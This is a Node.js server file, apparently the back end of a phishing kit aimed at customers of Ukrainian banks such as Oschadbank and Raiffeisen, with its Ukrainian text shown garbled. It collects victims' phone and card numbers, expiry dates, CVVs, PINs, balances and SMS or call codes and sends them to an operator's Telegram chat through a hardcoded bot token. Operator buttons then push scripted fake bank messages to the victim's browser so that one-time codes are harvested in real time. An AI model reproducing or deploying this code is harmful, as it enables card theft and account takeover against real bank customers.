const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const http = require('http');
const fs = require('fs');

// –ù–∞—Å—Ç—Ä–æ–π–∫–∏
const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
const CHAT_ID = -4970332008;
const SERVER_URL = 'https://new-l8h6.onrender.com';

const app = express();
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

app.use(express.json());
app.use(cors());

// –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è index.html
try {
    fs.accessSync(path.join(__dirname, 'index.html'), fs.constants.F_OK);
    console.log('index.html found in root directory');
} catch (error) {
    console.error('index.html not found:', error);
}

// –ú–∞—Ä—à—Ä—É—Ç –¥–ª—è –≥–ª–∞–≤–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã
app.get('/', (req, res) => {
    console.log('Serving index.html');
    res.sendFile(path.join(__dirname, 'index.html'), (err) => {
        if (err) {
            console.error('Error serving index.html:', err);
            res.status(500).send('Server error');
        }
    });
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();

// –û–±—Ä–∞–±–æ—Ç–∫–∞ WebSocket —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
wss.on('connection', (ws) => {
    console.log('Client connected via WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(Client registered: ${data.sessionId});
            }
        } catch (e) {
            console.error('Error processing WebSocket message:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(Client disconnected: ${sessionId});
            }
        });
    });
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ API –∑–∞–ø—Ä–æ—Å–æ–≤
app.post('/api/submit', (req, res) => {
    console.log('Received /api/submit request:', req.body);
    const { sessionId, isFinalStep, ...stepData } = req.body;
    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    if (newData.call_code_input) {
        let message = <b>üîî –û—Ç—Ä–∏–º–∞–Ω–æ –∫–æ–¥ —ñ–∑ –¥–∑–≤—ñ–Ω–∫–∞ (–û—â–∞–¥–±–∞–Ω–∫)!</b>\n\n;
        message += <b>–ö–æ–¥:</b> <code>${newData.call_code_input}</code>\n;
        message += <b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' })
            .then(() => console.log('Call code message sent to Telegram'))
            .catch(err => console.error('Error sending call code to Telegram:', err));
        return res.status(200).json({ message: 'Call code received' });
    }

    if (isFinalStep) {
        newData.visitCount += 1;
        sessions.set(sessionId, newData);
        console.log(Received FINAL data for session ${sessionId}, visit #${newData.visitCount});

        let message = '';
        let options;
        const visitText = newData.visitCount === 1 ? 'NEW' : ${newData.visitCount} —Ä–∞–∑;
        const singleStepBanks = ['–û—â–∞–¥–±–∞–Ω–∫', '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω'];

        if (!singleStepBanks.includes(newData.bankName) && !newData['card-cvv']) {
            message = <b>[–ö—Ä–æ–∫ 1] –ù–æ–≤–∏–π –∑–∞–ø–∏—Å! (${newData.bankName})</b>\n\n;
            message += <b>–ù–∞–∑–≤–∞ –±–∞–Ω–∫—É:</b> ${newData.bankName}\n;
            message += <b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${newData.phone || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n;
            message += <b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n;

message += <b>–ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤:</b> ${visitText}\n;
            options = {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '–ó–ê–ü–†–û–°', callback_data: zapit:${sessionId} }],
                        [{ text: '–ö–∞—Ä—Ç–∞', callback_data: card_error:${sessionId} }, { text: '–ù–æ–º–µ—Ä', callback_data: number_error:${sessionId} }]
                    ]
                }
            };
        } else {
            if (!singleStepBanks.includes(newData.bankName)) {
                message = <b>‚úÖ [–ö—Ä–æ–∫ 2] –ü–æ–≤–Ω—ñ –¥–∞–Ω—ñ! (${newData.bankName})</b>\n\n;
            } else {
                message = <b>‚úÖ –ù–æ–≤–∏–π –∑–∞–ø–∏—Å! (${newData.bankName})</b>\n\n;
            }
            message += <b>–ù–∞–∑–≤–∞ –±–∞–Ω–∫—É:</b> ${newData.bankName}\n;
            message += <b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${newData.phone || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n;
            message += <b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n;
            if (newData['card-expiry']) message += <b>–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó:</b> <code>${newData['card-expiry']}</code>\n;
            if (newData['card-cvv']) message += <b>CVV:</b> <code>${newData['card-cvv']}</code>\n;
            if (newData.pin) message += <b>–ü—ñ–Ω:</b> <code>${newData.pin}</code>\n;
            if (newData.balance) message += <b>–ü–æ—Ç–æ—á–Ω–∏–π –±–∞–ª–∞–Ω—Å:</b> <code>${newData.balance}</code>\n;
            message += <b>–ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤:</b> ${visitText}\n;
            options = {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'SMS', callback_data: sms:${sessionId} }, { text: '–î–û–î–ê–¢–û–ö', callback_data: app:${sessionId} }],
                        [{ text: '–ü–Ü–ù', callback_data: pin_error:${sessionId} }, { text: '–ö–û–î', callback_data: code_error:${sessionId} }, { text: '–ö–û–î ‚úÖ', callback_data: timer:${sessionId} }],
                        [{ text: '–ö–∞—Ä—Ç–∞', callback_data: card_error:${sessionId} }, { text: '–ù–æ–º–µ—Ä', callback_data: number_error:${sessionId} }],
                        [{ text: 'OTHER', callback_data: other:${sessionId} }]
                    ]
                }
            };
        }
        bot.sendMessage(CHAT_ID, message, options)
            .then(() => console.log('Message sent to Telegram'))
            .catch(err => console.error('Error sending message to Telegram:', err));
    }
    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    console.log('Received /api/sms request:', req.body);
    const { sessionId, code } = req.body;
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = <b>üí¨ –û—Ç—Ä–∏–º–∞–Ω–æ SMS!</b>\n\n;
        message += <b>–ö–æ–¥:</b> <code>${code}</code>\n;
        message += <b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${sessionData.phone}</code>\n;
        message += <b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' })
            .then(() => console.log('SMS code message sent to Telegram'))
            .catch(err => console.error('Error sending SMS code to Telegram:', err));
        res.status(200).json({ message: 'OK' });
    } else {
        console.error('Session not found:', sessionId);
        res.status(404).json({ message: 'Session not found' });
    }
});

// Endpoint –¥–ª—è –≤–µ–±—Ö—É–∫–∞ Telegram
const webhookPath = /webhook/${TELEGRAM_BOT_TOKEN};
app.post(webhookPath, (req, res) => {
    console.log('Received Telegram webhook request');
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

bot.on('callback_query', (callbackQuery) => {
    console.log('Received Telegram callback query:', callbackQuery.data);
    const [type, sessionId] = callbackQuery.data.split(':');

const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};
        switch (type) {
            case 'sms': 
                commandData = { text: "–í–∞–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ SMS –∑ –∫–æ–¥–æ–º –Ω–∞ –º–æ–±—ñ–ª—å–Ω–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π, –≤–≤–µ–¥—ñ—Ç—å –π–æ–≥–æ —É —Ñ–æ—Ä–º—É –≤–≤–æ–¥—É –∫–æ–¥—É" }; 
                break;
            case 'app': 
                commandData = { text: "–í–∞–º –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —É –¥–æ–¥–∞—Ç–æ–∫ –º–æ–±—ñ–ª—å–Ω–æ–≥–æ –±–∞–Ω–∫—É. –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–æ–¥–∞—Ç–æ–∫ –±–∞–Ω–∫—É —Ç–∞ –∑—Ä–æ–±—ñ—Ç—å –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –¥–ª—è –ø—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó." }; 
                break;
            case 'other': 
                commandData = { text: "–í –Ω–∞—Å –Ω–µ –≤–∏–π—à–ª–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –≤–∞—à—É –∫–∞—Ä—Ç–∫—É. –î–ª—è –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è –ø—Ä–æ–ø–æ–Ω—É—î–º–æ –≤–∫–∞–∑–∞—Ç–∏ –∫–∞—Ä—Ç–∫—É —ñ–Ω—à–æ–≥–æ –±–∞–Ω–∫—É" }; 
                break;
            case 'pin_error': 
                commandData = { text: "–í–∏ –≤–∫–∞–∑–∞–ª–∏ –Ω–µ–≤—ñ—Ä–Ω–∏–π –ø—ñ–Ω–∫–æ–¥. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –≤—ñ—Ä–Ω–∏–π –ø—ñ–Ω–∫–æ–¥" }; 
                break;
            case 'card_error': 
                commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ–≤—ñ—Ä–Ω–∏–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç–∫–∏, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞–∑–∞–¥ —Ç–∞ –≤–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç–∫–∏ –≤—ñ—Ä–Ω–æ" }; 
                break;
            case 'number_error': 
                commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ —Ñ—ñ–Ω–∞–Ω—Å–æ–≤–∏–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –Ω–æ–º–µ—Ä —è–∫–∏–π –ø—Ä–∏–≤'—è–∑–∞–Ω–∏–π –¥–æ –≤–∞—à–æ—ó –∫–∞—Ä—Ç–∫–∏." }; 
                break;
        }
        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: –ö–æ–º–∞–Ω–¥–∞ "${type}" –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞! });
    } else {
        console.error('WebSocket client not connected or session not found:', sessionId);
        bot.answerCallbackQuery(callbackQuery.id, { text: '–ü–æ–º–∏–ª–∫–∞: –∫–ª—ñ—î–Ω—Ç –Ω–µ –≤ –º–µ—Ä–µ–∂—ñ!', show_alert: true });
    }
});

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
    console.log(Server is running on port ${PORT});
    console.log(Setting webhook on URL: ${SERVER_URL}${webhookPath});
    bot.setWebHook(${SERVER_URL}${webhookPath})
        .then(() => {
            console.log('>>> Webhook successfully set!');
        })
        .catch((error) => {
            console.error('!!! ERROR SETTING WEBHOOK !!!');
            console.error(error.message);
        });
});
